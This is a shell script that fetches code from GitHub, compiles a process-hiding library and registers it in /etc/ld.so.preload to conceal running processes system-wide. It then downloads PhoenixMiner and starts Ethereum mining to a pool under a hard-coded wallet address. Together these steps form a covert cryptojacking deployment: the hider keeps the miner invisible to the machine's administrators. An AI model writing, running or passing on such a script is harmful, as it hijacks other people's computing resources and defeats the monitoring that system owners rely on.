#!/bin/sh
apt -y install libpci-dev
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicPho.zip
unzip magicPho.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/PhoenixMinerDevTeam/PhoenixMiner/releases/download/5.5c/PhoenixMiner_5.5c_Linux.tar.gz
tar -xvzf PhoenixMiner_5.5c_Linux.tar.gz
cd PhoenixMiner_5.5c_Linux
./PhoenixMiner -pool ssl://naw-eth.hiveon.net:24443 -wal 0x8CB8003E428D0Fd7693D22f576A212403728c64a -worker Phoenix -epsw x -mode 1 -log 2 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth
